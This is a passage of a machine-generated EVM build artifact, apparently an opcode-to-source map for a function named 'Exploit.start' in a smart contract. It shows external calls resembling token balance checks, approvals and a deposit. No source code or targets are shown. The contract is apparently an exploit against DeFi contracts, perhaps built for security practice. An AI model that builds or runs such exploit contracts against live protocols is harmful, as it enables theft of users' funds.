      "path": "0"
    },
    "1660": {
      "fn": "Exploit.start",
      "offset": [
        1996,
        2011
      ],
      "op": "AND",
      "path": "0"
    },
    "1661": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1663": {
      "op": "DUP3"
    },
    "1664": {
      "op": "ADD"
    },
    "1665": {
      "op": "MSTORE"
    },
    "1666": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1955
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1667": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1955
      ],
      "op": "AND",
      "path": "0"
    },
    "1668": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1955
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1669": {
      "op": "POP"
    },
    "1670": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1966
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1C4009F9"
    },
    "1675": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1966
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1676": {
      "op": "POP"
    },
    "1677": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "1679": {
      "op": "ADD"
    },
    "1680": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1682": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1684": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1685": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1686": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1687": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "SUB",
      "path": "0"
    },
    "1688": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1689": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1691": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1692": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1693": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "1694": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1695": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1696": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1697": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6A9"
    },
    "1700": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1701": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1703": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1704": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1705": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1706": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "POP",
      "path": "0"
    },
    "1707": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "GAS",
      "path": "0"
    },
    "1708": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "CALL",
      "path": "0"
    },
    "1709": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1710": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1711": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1712": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6BD"
    },
    "1715": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1716": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1717": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1719": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1720": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1721": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1722": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1724": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1725": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1726": {
      "op": "POP"
    },
    "1727": {
      "op": "POP"
    },
    "1728": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x6"
    },
    "1730": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1731": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1733": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1734": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1739": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1741": {
      "op": "SHL"
    },
    "1742": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1743": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1744": {
      "fn": "Exploit.start",
      "offset": [
        2078,
        2082
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1745": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1747": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1748": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ADD",
      "path": "0"
    },
    "1749": {
      "op": "MSTORE"
    },
    "1750": {
      "fn": "Exploit.start",
      "offset": [
        2024,
        2041
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1752": {
      "fn": "Exploit.start",
      "offset": [
        2024,
        2041
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "1753": {
      "op": "POP"
    },
    "1754": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1756": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1758": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1760": {
      "op": "SHL"
    },
    "1761": {
      "op": "SUB"
    },
    "1762": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1763": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1764": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "AND",
      "path": "0"
    },
    "1765": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2059
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1766": {
      "op": "POP"
    },
    "1767": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2069
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "1772": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2069
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1773": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1775": {
      "op": "ADD"
    },
    "1776": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1778": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1780": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1781": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1782": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1783": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "SUB",
      "path": "0"
    },
    "1784": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1785": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1786": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "GAS",
      "path": "0"
    },
    "1787": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "1788": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1789": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1790": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1791": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x70C"
    },
    "1794": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1795": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1796": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1798": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1799": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1800": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1801": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1803": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1804": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1805": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "POP",
      "path": "0"
    },
    "1806": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "POP",
      "path": "0"
    },
    "1807": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "POP",
      "path": "0"
    },
    "1808": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "POP",
      "path": "0"
    },
    "1809": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1811": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1812": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1813": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1815": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "NOT",
      "path": "0"
    },
    "1816": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1818": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1819": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ADD",
      "path": "0"
    },
    "1820": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "AND",
      "path": "0"
    },
    "1821": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1822": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ADD",
      "path": "0"
    },
    "1823": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1824": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1826": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1827": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "POP",
      "path": "0"
    },
    "1828": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1829": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "ADD",
      "path": "0"
    },
    "1830": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1831": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x730"
    },
    "1834": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1835": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1836": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "1839": {
      "fn": "Exploit.start",
      "jump": "i",
      "offset": [
        2044,
        2084
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1840": {
      "fn": "Exploit.start",
      "offset": [
        2044,
        2084
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1841": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2109
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 8,
      "value": "0x6"
    },
    "1843": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2109
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1844": {
      "fn": "Exploit.start",
      "offset": [
        2126,
        2152
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "1846": {
      "fn": "Exploit.start",
      "offset": [
        2126,
        2152
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1847": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1849": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1850": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "1855": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1857": {
      "op": "SHL"
    },
    "1858": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1859": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1860": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1862": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1864": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1866": {
      "op": "SHL"
    },
    "1867": {
      "op": "SUB"
    },
    "1868": {
      "fn": "Exploit.start",
      "offset": [
        2126,
        2152
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1869": {
      "fn": "Exploit.start",
      "offset": [
        2126,
        2152
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1870": {
      "fn": "Exploit.start",
      "offset": [
        2126,
        2152
      ],
      "op": "AND",
      "path": "0"
    },
    "1871": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1873": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1874": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ADD",
      "path": "0"
    },
    "1875": {
      "op": "MSTORE"
    },
    "1876": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1878": {
      "op": "DUP2"
    },
    "1879": {
      "op": "ADD"
    },
    "1880": {
      "op": "DUP5"
    },
    "1881": {
      "op": "SWAP1"
    },
    "1882": {
      "op": "MSTORE"
    },
    "1883": {
      "fn": "Exploit.start",
      "offset": [
        2024,
        2084
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1884": {
      "fn": "Exploit.start",
      "offset": [
        2024,
        2084
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "1885": {
      "op": "POP"
    },
    "1886": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2109
      ],
      "op": "AND",
      "path": "0"
    },
    "1887": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2109
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1888": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2117
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x95EA7B3"
    },
    "1893": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2117
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1894": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1896": {
      "op": "ADD"
    },
    "1897": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1899": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1901": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1902": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1903": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1904": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "SUB",
      "path": "0"
    },
    "1905": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1906": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1908": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1909": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "GAS",
      "path": "0"
    },
    "1910": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "CALL",
      "path": "0"
    },
    "1911": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1912": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1913": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1914": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x787"
    },
    "1917": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1918": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1919": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1921": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1922": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1923": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1924": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1926": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1927": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1928": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "POP",
      "path": "0"
    },
    "1929": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "POP",
      "path": "0"
    },
    "1930": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "POP",
      "path": "0"
    },
    "1931": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "POP",
      "path": "0"
    },
    "1932": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1934": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1935": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1936": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1938": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "NOT",
      "path": "0"
    },
    "1939": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1941": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1942": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ADD",
      "path": "0"
    },
    "1943": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "AND",
      "path": "0"
    },
    "1944": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1945": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ADD",
      "path": "0"
    },
    "1946": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1947": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1949": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1950": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "POP",
      "path": "0"
    },
    "1951": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1952": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "ADD",
      "path": "0"
    },
    "1953": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1954": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x7AB"
    },
    "1957": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1958": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1959": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "1962": {
      "fn": "Exploit.start",
      "jump": "i",
      "offset": [
        2094,
        2168
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1963": {
      "fn": "Exploit.start",
      "offset": [
        2094,
        2168
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1964": {
      "op": "POP"
    },
    "1965": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 9,
      "value": "0x7"
    },
    "1967": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1968": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1970": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1971": {
      "op": "PUSH4",
      "value": "0xB6B55F25"
    },
    "1976": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1978": {
      "op": "SHL"
    },
    "1979": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1980": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1981": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1983": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1984": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "ADD",
      "path": "0"
    },
    "1985": {
      "op": "DUP4"
    },
    "1986": {
      "op": "SWAP1"
    },
    "1987": {
      "op": "MSTORE"
    },
    "1988": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1990": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1992": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1994": {
      "op": "SHL"
    },
    "1995": {
      "op": "SUB"
    },
    "1996": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1997": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1998": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "AND",
      "path": "0"
    },
    "1999": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2204
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2000": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2212
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xB6B55F25"
    },
    "2005": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2212
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2006": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2008": {
      "op": "ADD"
    },
    "2009": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2011": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2013": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2014": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2015": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2016": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "SUB",
      "path": "0"
    },
    "2017": {
      "fn": "Exploit.start",
      "offset": [
        2178,
        2226
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2018": {
